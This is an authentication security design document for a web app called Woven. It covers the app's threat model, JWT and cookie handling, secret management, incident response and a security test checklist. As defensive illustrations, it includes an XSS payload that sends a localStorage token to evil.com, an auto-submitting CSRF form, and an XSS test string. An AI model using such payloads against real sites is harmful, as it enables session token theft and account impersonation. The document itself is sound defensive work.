# Authentication Security

**Last Updated:** 2026-10-07  
**Status:** Production-ready with known limitations

---

## Security Posture Summary

| Category | Status | Notes |
|---|---|---|
| **Password Storage** | N/A | No passwords (Google OAuth only) |
| **Token Signing** | ✅ HS256 (HMAC-SHA256) | 512-bit symmetric key in Key Vault |
| **Token Storage** | ⚠️ Dual-mode | Backend: httpOnly cookies ✅ / Frontend: localStorage ❌ |
| **HTTPS Enforcement** | ✅ Production only | Dev: HTTP (acceptable for localhost) |
| **CSRF Protection** | ✅ SameSite=Strict | Cookies not sent on cross-site requests |
| **XSS Protection** | ⚠️ Partial | httpOnly cookies ready, frontend not migrated |
| **Rate Limiting** | ✅ 20 auth/day/IP | Prevents brute-force, credential stuffing |
| **Secret Management** | ✅ Azure Key Vault | No secrets in code or appsettings.json |
| **Token Revocation** | ❌ Not supported | Stateless JWT = can't revoke before expiry |
| **MFA (Multi-Factor Auth)** | ❌ Not implemented | Google's MFA only (if user enabled it) |
| **Account Takeover Protection** | ✅ Partial | Device fingerprint, velocity checks |

---

## Threat Model

### In-Scope Threats

| Threat | Likelihood | Impact | Mitigation |
|---|---|---|---|
| **XSS (Cross-Site Scripting)** | Medium | High (token theft) | httpOnly cookies (backend ready) |
| **CSRF (Cross-Site Request Forgery)** | Low | Medium (unwanted actions) | SameSite=Strict cookies ✅ |
| **MITM (Man-in-the-Middle)** | Low | High (token interception) | HTTPS in production ✅ |
| **Token Replay** | Medium | Medium (stolen token reuse) | Short lifetime (60 min) ✅ |
| **Credential Stuffing** | Low | Medium (account takeover) | Google OAuth (no passwords) ✅ |
| **Brute Force** | Low | Low (Google handles this) | Rate limiting (20 auth/day/IP) ✅ |
| **Session Fixation** | Low | Low (new token on each login) | Stateless JWT (no session IDs) ✅ |
| **Token Theft (Physical Access)** | Medium | High (device left unlocked) | Auto-expiry (60 min) ✅ |

### Out-of-Scope Threats

| Threat | Why Out-of-Scope |
|---|---|
| **SQL Injection** | Not auth-specific (covered in data layer docs) |
| **DDoS** | Handled by Azure Front Door (infra layer) |
| **Social Engineering** | User education, not technical control |
| **Insider Threats** | Requires org policies, audit logs |

---

## Security Layers

### Layer 1: OAuth Provider (Google)

**Responsibility:** User authentication, identity verification

**Google's security measures:**
- Passwordless sign-in (passkeys, biometrics)
- MFA (if user enables it)
- Anomaly detection (suspicious login alerts)
- Account recovery (phone verification)

**Woven's trust in Google:**
- We verify Google ID tokens using Google's public keys (JWKS)
- We check `iss` claim = "accounts.google.com"
- We check `aud` claim = Woven's Client ID
- We check token expiry

**Attack vector:** Compromised Google account → attacker gets valid ID token → can login to Woven.

**Mitigation:**
- Encourage users to enable Google's MFA
- Add secondary verification (SMS, email) for sensitive actions (future)

### Layer 2: JWT Issuance & Validation

**Responsibility:** Convert Google identity → Woven session

**Security measures:**
- **HS256 signing** — symmetric 512-bit key (Azure Key Vault)
- **Issuer validation** — `iss` must be "WovenBackend"
- **Audience validation** — `aud` must be "WovenFrontend"
- **Expiry validation** — `exp` must be in the future
- **Clock skew tolerance** — 1 min (prevents time sync issues)

**Attack vector:** Attacker steals `Jwt:Key` → can forge valid tokens.

**Mitigation:**
- Key stored in Azure Key Vault (not in code)
- Key rotation every 90 days (manual, not automated yet)
- Managed Identity for Key Vault access (no connection strings)

### Layer 3: Token Storage (Client-Side)

**Current (vulnerable):**
- Frontend stores JWT in `localStorage`
- JavaScript can read it: `localStorage.getItem('accessToken')`
- XSS attack → attacker steals token → impersonates user

**Future (secure):**
- Frontend uses httpOnly cookies only
- JavaScript cannot read cookie (httpOnly flag)
- XSS attack → attacker cannot extract token

**Migration status:** Backend ready ✅ / Frontend pending ⚠️

### Layer 4: Transport Security (HTTPS)

**Production:**
- ✅ HTTPS enforced (Azure Front Door terminates TLS)
- ✅ TLS 1.2+ only (older versions rejected)
- ✅ HSTS header (forces HTTPS for 1 year)

**Development:**
- ⚠️ HTTP allowed (localhost only)
- Risk: Network sniffing on local network (acceptable for dev)

**Certificate:**
- Let's Encrypt (auto-renewed via Azure)
- Wildcard cert: `*.wooven.me`

### Layer 5: CSRF Protection

**Mechanism:** SameSite=Strict cookies

**What it does:**
- Browser won't send cookie on cross-site requests
- Attacker can't make API calls from their site (e.g., `evil.com` → `wooven.me/matches`)

**Example attack (fails):**
```html
<!-- evil.com/steal.html -->
<form action="https://wooven.me/matches/123/pop" method="POST">
  <input type="hidden" name="action" value="pop">
</form>
<script>document.forms[0].submit();</script>
```

**Result:** Cookie is **not sent** (SameSite=Strict) → request is unauthenticated → HTTP 401.

**Edge case:** If we switch to SameSite=Lax (for deep link support), CSRF is still prevented by `POST` method (Lax only allows cookies on `GET`).

### Layer 6: Rate Limiting

**File:** `AuthEndpoints.cs:29-38`

**Limits:**
- **Auth endpoint:** 20 attempts/day/IP
- **Global per-user:** 120 requests/60s (all endpoints)
- **AI-heavy endpoints:** 10 requests/60s (deck generation, match explanations)

**Implementation:**
- Redis-backed sliding window
- IP hashing (PII protection)
- `Retry-After` header on 429 response

**Attack mitigation:**
- Prevents credential stuffing (not applicable, we use Google OAuth)
- Prevents automated bot signups
- Prevents token brute-forcing (not applicable, tokens are 256+ bits)

**Edge case:** Corporate NAT (many users behind one IP) could hit limit. Monitor logs for false positives.

---

## Attack Scenarios & Mitigations

### Scenario 1: XSS Token Theft

**Attack:**
1. Attacker finds XSS vulnerability (e.g., unsanitized input in search results)
2. Attacker injects script: `<script>fetch('https://evil.com/steal?token='+localStorage.getItem('accessToken'))</script>`
3. Victim visits page → script runs → token sent to attacker
4. Attacker uses token to impersonate victim

**Current mitigation:**
- ⚠️ localStorage is vulnerable
- ✅ CSP headers partially mitigate (block inline scripts)

**Future mitigation:**
- ✅ httpOnly cookies (JavaScript cannot read token)
- ✅ Frontend migration removes `localStorage.getItem('accessToken')`

**Residual risk:** Even with httpOnly cookies, attacker can still make API calls as the victim (cookie is auto-sent). Can't extract token for later use, though.

### Scenario 2: MITM Token Interception

**Attack:**
1. Victim connects to malicious Wi-Fi (e.g., coffee shop)
2. Attacker MITMs HTTPS connection (self-signed cert)
3. Victim ignores browser warning → attacker intercepts token

**Current mitigation:**
- ✅ HTTPS enforced in production
- ✅ HSTS header (browser refuses HTTP)
- ⚠️ User must not ignore cert warnings

**Future mitigation:**
- ✅ Certificate pinning (mobile apps only)
- ✅ Public Key Pinning (HPKP) header (deprecated, not recommended)

**Residual risk:** If user ignores cert warnings, MITM is possible. No technical fix (user education).

### Scenario 3: Token Replay (Stolen Token)

**Attack:**
1. Attacker steals token (XSS, MITM, physical access to device)
2. Attacker uses token to make API calls
3. Token remains valid until expiry (60 min)

**Current mitigation:**
- ✅ Short token lifetime (60 min)
- ✅ httpOnly cookies (harder to steal)
- ❌ No revocation (can't invalidate stolen token)

**Future mitigation:**
- ✅ Token revocation list (Redis-backed)
- ✅ Device binding (token only works on original device)

**Residual risk:** 60-minute window where stolen token is usable.

### Scenario 4: Account Takeover (Compromised Google Account)

**Attack:**
1. Attacker compromises victim's Google account (phishing, weak password)
2. Attacker logs into Woven using victim's Google account
3. Attacker has full access to victim's Woven profile

**Current mitigation:**
- ✅ Google's security (MFA, anomaly detection)
- ✅ Device fingerprint tracking (flags suspicious logins)
- ❌ No secondary verification on sensitive actions

**Future mitigation:**
- ✅ Require re-auth for sensitive actions (delete account, change email)
- ✅ Email notification on new device login
- ✅ SMS verification for account recovery

**Residual risk:** If Google account is compromised and attacker disables MFA, Woven has no independent defense.

### Scenario 5: Session Fixation

**Attack:**
1. Attacker generates a JWT with their own user ID
2. Attacker tricks victim into using that token
3. Victim's actions are attributed to attacker's account

**Current mitigation:**
- ✅ Not applicable (stateless JWT, no session IDs)
- ✅ Token is tied to user ID (can't transfer sessions)

**Why not a threat:** We don't use session IDs. Each login generates a new JWT. Can't "fix" a session.

---

## Trust Signals (Phase 2B)

**File:** `AuthEndpoints.cs:108-119`

**Purpose:** Detect suspicious logins without blocking them

**Signals collected:**

| Signal | What it detects | Action on anomaly |
|---|---|---|
| **Device fingerprint** | Same user, different device | Log event, flag for review |
| **Login velocity** | >100 logins/hour | Log event, alert ops team |
| **IP geolocation** | User in India, then US 5 min later | Log event, send email alert |

**Non-blocking:** Trust checks run in background (fire-and-forget). Login always succeeds, even if checks fail.

**Future use:** Feed into ML model for anomaly detection, auto-block high-risk accounts.

---

## Secret Management

### Development (User Secrets)

**Storage:** `~/.microsoft/usersecrets/<user-secrets-id>/secrets.json`

**Access:**
```powershell
dotnet user-secrets list
dotnet user-secrets set "Jwt:Key" "kX8vZ3mQ9pL2wN5tR7cH1jK4yF6bV0sA..."
```

**Security:**
- ✅ Not in source control
- ✅ Per-developer (not shared)
- ⚠️ Stored in plaintext on disk (OS file permissions protect it)

### Production (Azure Key Vault)

**Storage:** Azure Key Vault (`woven-prod-kv`)

**Access:**
- ✅ Managed Identity (no connection strings)
- ✅ RBAC (only backend pods can read secrets)
- ✅ Audit logs (every secret access is logged)

**Secrets stored:**
- `Jwt--Key` (JWT signing key)
- `ConnectionStrings--DefaultConnection` (PostgreSQL)
- `OpenAI--ApiKey` (OpenAI API key)
- `Vapid--PrivateKey` (Web Push)
- `Azure--Storage--ConnectionString` (Blob Storage)

**Rotation policy:**
- JWT key: 90 days (manual)
- Database password: 90 days (manual)
- OpenAI API key: Never (no expiry)

**Future:** Automate key rotation (Azure Key Vault auto-rotation feature).

---

## HTTPS & TLS Configuration

### Production (Azure Front Door)

**TLS termination:** Azure Front Door (not backend)

**Backend receives:** HTTP (internal traffic only, isolated vnet)

**Certificate:** Let's Encrypt (auto-renewed)

**TLS version:** 1.2+ (1.0/1.1 rejected)

**Cipher suites:** Modern only (no RC4, no MD5)

**HSTS header:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Redirect:** HTTP → HTTPS (301 permanent)

### Development (localhost)

**No HTTPS:** `http://localhost:5135`

**Why?** Self-signed certs are annoying (browser warnings, cert trust issues).

**Risk:** Network sniffing on local network. Acceptable for dev.

**httpOnly cookies work over HTTP** (browser allows it for localhost).

---

## Authentication Audit Log

**Not yet implemented.** Here's the design:

**Table:** `auth_audit_logs`

| Column | Type | Purpose |
|---|---|---|
| `id` | bigserial | PK |
| `user_id` | int | User who performed action |
| `event_type` | text | `login`, `logout`, `token_refresh`, `password_reset` |
| `ip_address_hash` | text | Hashed IP (GDPR compliance) |
| `user_agent` | text | Browser/device info |
| `device_fingerprint` | text | Canvas hash, WebGL hash, etc. |
| `trust_score` | float | 0.0 (suspicious) - 1.0 (trusted) |
| `success` | boolean | `true` if action succeeded |
| `failure_reason` | text | `expired_token`, `invalid_signature`, etc. |
| `occurred_at` | timestamptz | Event timestamp |

**Use cases:**
- Security dashboard ("Show me all logins from new devices")
- Incident response ("User claims account hacked — show me their auth history")
- Compliance (GDPR right-of-access: "Show me all my login records")

**Retention:** 90 days (GDPR compliance)

---

## Security Headers

### Current

**CORS:**
```
Access-Control-Allow-Origin: http://localhost:4202, https://wooven.me
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: *
```

**HSTS (production only):**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**X-Correlation-ID:**
```
X-Correlation-ID: 1a2b3c4d5e6f7890
```

### Future (CSP, XSS Protection)

**Content-Security-Policy:**
```
default-src 'self';
script-src 'self' https://apis.google.com;
style-src 'self' 'unsafe-inline';
img-src 'self' data: https://lh3.googleusercontent.com;
connect-src 'self' https://wooven.me;
frame-ancestors 'none';
```

**X-Content-Type-Options:**
```
X-Content-Type-Options: nosniff
```

**X-Frame-Options:**
```
X-Frame-Options: DENY
```

**X-XSS-Protection (legacy):**
```
X-XSS-Protection: 1; mode=block
```

**Referrer-Policy:**
```
Referrer-Policy: strict-origin-when-cross-origin
```

---

## Compliance & Privacy

### GDPR (General Data Protection Regulation)

**Relevant to auth:**
- ✅ Right of access: Users can request their auth history (future: audit log)
- ✅ Right to erasure: Users can delete their account (deletes `users` + `auth_identities`)
- ✅ Data minimization: We store only email, name, photo (no DOB, phone, address yet)
- ✅ Purpose limitation: Auth data used only for authentication, not marketing

**Google OAuth & GDPR:**
- Google is the data controller for Google account data
- Woven is the data controller for Woven profile data
- Google's Privacy Policy: https://policies.google.com/privacy

### PII (Personally Identifiable Information)

**PII stored in auth system:**
- Email address (hashed in rate limit keys, plaintext in database)
- Full name (plaintext)
- Profile photo URL (plaintext, hosted by Google)
- IP address (hashed in rate limit keys, **not** stored long-term)

**PII NOT stored:**
- Google password (Google handles auth)
- Phone number (not collected yet)
- Date of birth (stored in onboarding, not auth)

**Hashing:** SHA-256 with app-specific salt (`"rl-auth-v1"`)

---

## Security Incident Response

### Suspected Token Theft

**Symptoms:**
- User reports "someone logged into my account"
- Analytics shows logins from different geolocations within minutes
- Device fingerprint mismatch

**Response:**
1. **Immediate:** Force-logout user (clear cookies via `/auth/logout`)
2. **Investigation:** Check auth audit log (when implemented)
3. **Mitigation:** Add stolen token to revocation list (when implemented)
4. **Communication:** Email user: "We detected suspicious activity..."
5. **Prevention:** Add MFA requirement for that user

### Compromised JWT Signing Key

**Symptoms:**
- Forged tokens with valid signatures
- Unauthorized access to admin endpoints

**Response:**
1. **Immediate:** Rotate `Jwt:Key` in Azure Key Vault
2. **Deployment:** Redeploy backend (loads new key)
3. **Invalidation:** All existing tokens become invalid (users must re-login)
4. **Communication:** Status page: "Planned maintenance — please log in again"
5. **Investigation:** Audit Key Vault access logs (who accessed the key?)

### Mass Account Takeover

**Symptoms:**
- Spike in "account hacked" reports
- Common pattern (e.g., all victims used same third-party app)

**Response:**
1. **Immediate:** Rate-limit `/auth/google` to 1 attempt/min globally
2. **Investigation:** Identify attack vector (XSS? Phishing? Google breach?)
3. **Mitigation:** Force-logout all users (revoke all tokens)
4. **Communication:** Email all users + Twitter announcement
5. **Prevention:** Add secondary verification (SMS) for sensitive actions

---

## Security Testing

### Automated Security Tests

**Current:** None

**Future:**
- OWASP ZAP integration (CI/CD security scans)
- Dependency vulnerability scanning (Dependabot)
- Secret scanning (GitHub secret scanning)

### Manual Security Tests

**Quarterly security review checklist:**
- [ ] Verify `Jwt:Key` is >256 bits
- [ ] Verify `Secure=true` in production cookies
- [ ] Verify HTTPS redirect works (`http://wooven.me` → `https://wooven.me`)
- [ ] Test XSS in search results (input: `<script>alert(1)</script>`)
- [ ] Test CSRF (make POST request from different domain)
- [ ] Test expired token rejection (modify `exp` claim)
- [ ] Test invalid signature rejection (modify token payload)
- [ ] Test rate limiting (make 21 auth requests from same IP)
- [ ] Verify Key Vault access logs (check for unauthorized access)

---

## Known Vulnerabilities & Accepted Risks

| Vulnerability | Impact | Risk | Mitigation Plan |
|---|---|---|---|
| **localStorage token storage** | High (XSS) | Medium | Migrate to httpOnly cookies (Q4 2026) |
| **No token revocation** | Medium (stolen token) | Medium | Add revocation list (Q4 2026) |
| **No MFA** | High (account takeover) | Low (Google MFA exists) | Add app-level MFA (Q1 2027) |
| **Stateless JWT = no force-logout** | Medium (stolen token) | Low (60 min expiry) | Add refresh tokens (Q1 2027) |
| **No device binding** | Medium (token replay) | Low (rare) | Add opt-in "High Security Mode" (Q2 2027) |

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Security Best Practices (RFC 8725)](https://tools.ietf.org/html/rfc8725)
- [Azure Key Vault Best Practices](https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices)
- [Google OAuth 2.0 Security](https://developers.google.com/identity/protocols/oauth2)

---

**Next:** Read [api.md](./api.md) for detailed auth endpoint request/response schemas.
